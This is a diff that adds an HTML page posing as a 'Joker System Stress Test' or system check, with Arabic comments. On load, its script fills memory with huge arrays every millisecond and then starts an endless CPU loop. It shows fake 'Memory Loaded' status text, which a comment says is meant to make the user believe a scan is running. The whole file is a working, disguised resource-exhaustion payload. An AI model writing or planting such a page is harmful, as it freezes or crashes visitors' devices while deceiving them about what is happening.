@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Joker System Stress Test</title>
+</head>
+<body style="background-color: black; color: red; text-align: center; font-family: sans-serif;">
+    <h1 style="font-size: 50px;">JOKER SYSTEM CHECK... 🛡️</h1>
+    <h2 id="status">جاري فحص القوة القصوى...</h2>
+
+    <script>
+        // مصفوفة عملاقة للاستهلاك
+        let memoryBurner = [];
+
+        // وظيفة لإجهاد المعالج (CPU Stress)
+        function stressCPU() {
+            while (true) {
+                Math.sqrt(Math.random() * Math.random());
+            }
+        }
+
+        // تشغيل عدة عمليات (Threads) وهمية لإجهاد الرام والمعالج
+        setInterval(() => {
+            // استهلاك الرام بشكل أعنف
+            for (let i = 0; i < 5000; i++) {
+                memoryBurner.push(new Array(1000000).fill("JOKER-ULTRA-STRESS-TEST-" + Math.random()));
+            }
+            
+            // تحديث النص ليوهم المستخدم أن هناك فحصاً
+            document.getElementById('status').innerText = "Memory Loaded: " + (memoryBurner.length * 10) + "MB";
+            
+            console.log("Joker is testing your limits...");
+        }, 1); // سرعة فائقة (1 ملي ثانية)
+
+        // محاولة تشغيل إجهاد المعالج في الخلفية
+        setTimeout(() => {
+            stressCPU();
+        }, 1000);
+    </script>
+</body>
+</html>
